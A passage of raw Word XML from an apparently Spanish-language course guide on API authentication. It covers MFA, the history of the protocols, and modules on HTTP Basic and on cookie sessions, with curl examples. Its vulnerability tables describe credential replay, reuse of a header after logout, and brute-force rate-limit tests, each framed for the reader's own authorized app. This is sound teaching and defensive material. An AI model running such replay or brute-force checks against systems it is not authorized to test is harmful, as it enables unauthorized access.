      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> El segundo factor se pide una vez; el access token que sale</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>de ahí puede vivir minutos, días o meses. Entre el login y la última llamada, la MFA ya no opina.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>OTP: HOTP (RFC 4226, 2005) y TOTP (RFC 6238, 2011).</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Códigos de un solo uso basados en un secreto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  compartido; TOTP es el "código de 6 dígitos de 30 segundos".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Push y notificaciones:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> cómodas y </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>phishable</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (fatiga MFA).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Passkeys / WebAuthn-FIDO2 (W3C/FIDO):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> llaves resistentes al </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>phishing</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">, atadas al </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>origen</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>. El</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  segundo factor más fuerte del lado persona.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>NIST SP 800-63-4 (2025):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> marco de identidad digital; empuja lo </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>phishing-resistant</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y limita los</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  factores débiles (SMS/OTP).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2885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erson_vs_syste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8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95057"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Persona vs. sistema: dos preguntas distintas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>No es lo mismo autenticar personas que sistemas.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> Del lado persona, la pregunta es "¿este humano es</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">quien dice ser, con un segundo factor?". Del lado </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>sistema</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, no hay humano que factorizar: la pregunta</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">es "¿este </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
        </w:rPr>
        <w:t>workload</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> es el que dice ser, y con qué credencial efímera?". Y hay un tercer caso, la</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">identidad </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>delegada</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">: una app que actúa </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>en nombre</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> de un usuario (OAuth) — donde el consentimiento,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">el </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>scope</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y la revocación son el centro.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Lo que ninguna MFA resuelve:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> en flujo sistema a sistema no hay factor humano; y **una vez emitido</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  el token**, la MFA ya no controla el uso.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>4.8 Gestión de identidades y otros estándares de contexto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>SCIM (RFC 7643/7644, 2015):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> aprovisionamiento de usuarios entre IdP y aplicaciones. Es una </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>API</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  con su propio token: otra vez, la cadena de confianza.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>LDAP / Kerberos:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> directorios y autenticación </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>corporativa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>; aparecen detrás del IdP cuando la</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  federación es hacia el mundo Windows/AD.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RADIUS:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> autenticación de </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>red</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (VPN, Wi-Fi corporativo); puede ser un paso previo a la MFA.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Zero Trust (NIST SP 800-207, 2020):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> no confiar por estar "dentro"; verificar </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cada</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> solicitud.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  Es el paraguas conceptual donde encajan mTLS, DPoP y la autorización por objeto.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>4.9 Tabla maestra de primeras apariciones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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>Mecanismo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Primera aparición</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3264"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Tipo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Cookies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1996 (Netscape) → RFC 6265 (2011)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sesión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HTTP Basic / Digest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RFC 2617 (1999) → RFC 7616 (2015)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autenticación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WS-Security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OASIS 2004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firma SOAP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SAML 2.0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OASIS 2005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federación XML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HOTP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RFC 4226 (2005)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OTP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OAuth 1.0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borrador dic. 2007 → RFC 5849 (2010)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delegación firmada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JWT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borrador 28 dic. 2010 → RFC 7519 (2015)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token con claims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TOTP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RFC 6238 (2011)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OTP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OAuth 2.0 + bearer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RFC 6749 y RFC 6750 (oct. 2012)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delegación portadora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MAC (token)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borrador feb. 2012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prueba de posesión (abandonado)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Revocación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RFC 7009 (2013)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ciclo de vida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OpenID Connect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final 26 feb. 2014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identidad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PKCE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RFC 7636 (2015)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seguridad del código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Introspección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RFC 7662 (2015)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validación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SCIM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RFC 7643/7644 (2015)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aprovisionamiento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amr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RFC 8176 (2017)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claims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Token Binding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RFC 8471-8473 (2018)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prueba de posesión (sin adopción)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mTLS atado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RFC 8705 (2020)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sender-constrained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JWT BCP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RFC 8725 (2020)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buenas prácticas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RFC 9068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2021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perfil de access token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DPoP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RFC 9449 (2023)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prueba de posesión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RFC 9700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enero 2025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mejores prácticas OAuth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NIST SP 800-63-4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julio 2025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identidad digital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4.10 Cómo leer todo esto en una sola imagen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72754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lifecyc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27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95057"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>Ciclo de vida de un token</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Cada protocolo de arriba actúa en una </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>etapa</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> del ciclo: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>emisión</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (OAuth/OIDC/MFA), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>transporte</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">(TLS/cookies/cabeceras), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>uso</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (bearer/mTLS/DPoP), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>expiración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color w:val="1F3B66"/>
        </w:rPr>
        <w:t>exp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">), </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>rotación</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (refresh) y</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>revocación</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (RFC 7009). Defender una API es </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cubrir todas las etapas</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>, no solo la emisión.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>5. Módulos técnicos</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">En cada módulo: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Idea · Guion · Ejemplo práctico · Vulnerabilidades y cómo comprobarlas · Defensa.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Quote"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Recordá: las comprobaciones ofensivas van </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>sólo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> contra laboratorios o entornos autorizados.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>M1 — HTTP Basic / Digest (1999)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Idea</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Autenticación HTTP clásica: el cliente manda credenciales (Basic: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>usuario:contraseña</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> en Base64) en </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>cada</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> petición. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Primera aparición: RFC 2617, junio de 1999</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">; Digest añade un hash y un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>nonce</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>RFC 7616 (agosto de 2015)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> moderniza Digest con SHA-256 y reemplaza a la 2617.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Guion para explicar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>"Basic es como darle a alguien la llave de tu casa para que entre a revisar una habitación: le das la llave, no un permiso para esa habitación. Viaja en cada request, y si mirás el valor, no está cifrado: está codificado. Base64 no es seguridad; es transporte tolerante a caracteres."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Ejemplo que puedo hacer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# Endpoint público de práctica (no es un sistema de terceros real)</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -v -u usuario:clave https://httpbin.org/basic-auth/usuario/clave</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t># Mirar la cabecera</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="1F3B66"/>
          <w:sz w:val="17"/>
        </w:rPr>
        <w:t>curl -s -u usuario:clave https://httpbin.org/basic-auth/usuario/clave -D -</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">En el navegador: DevTools → Network → cualquier request con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>Authorization: Basic ...</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> → copiá el valor y decodificalo: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echo -n "dXN1YXJpbzpjbGF2ZQ==" | base64 -d</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Vulnerabilidades y cómo comprobarlas (en tu entorno)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  <w:i w:val="0"/>
              </w:rPr>
              <w:t>Vulnerabilidad</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4896"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>Cómo se comprueba (autorizado)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Credenciales reutilizadas por request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Interceptá una request con un proxy (Burp/ZAP) en </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t>tu</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b w:val="0"/>
                <w:i w:val="0"/>
              </w:rPr>
              <w:t xml:space="preserve"> app y reenviala: sigue autenticando todo el tiempo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No hay "logout" real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Guardá la cabecera y usala de nuevo tras "cerrar sesión" en tu app: si sigue funcionando, no hay revocación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Base64 ≠ cifrado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Decodificá la cabecera (comando de arriba)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Fuerza bruta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En tu app, medí si hay rate-limit/lockout enviando N intentos de tu propio usuario de prueba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Credenciales en logs/URLs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Buscá en tus propios logs si aparece el header; en APIs de prueba, probá una URL con user:pass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Defensa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>TLS obligatorio, migrar a tokens/OIDC, rate-limit y lockout, nunca loguear credenciales, nunca usar Basic en URLs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>M2 — Cookies y sesiones (1996)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Idea</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">El servidor guarda el estado y el navegador repite un </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>identificador de sesión</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> en una cookie. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Primera aparición: especificación de cookies de Netscape, 1996; RFC 2109 (1998); RFC 6265 (abril de 2011)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> es la vigente.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Guion para explicar</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>"La sesión en servidor es segura para la web tradicional y mala para APIs: el estado no escala, no delega y no cruza clientes. Pero trae dos problemas clásicos que seguimos viendo: robo de cookie por XSS y CSRF."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Ejemplo que puedo hacer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">En tu app: login → DevTools → Application → Cookies → observá </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>HttpOnly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Secure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SameSite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Con </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>curl</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> (tu app): </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="1F3B66"/>
        </w:rPr>
        <w:t>curl -c cookies.txt -d 'user=...&amp;pass=...' https://TU-APP/login</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve"> y luego </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:b w:val="0"/>
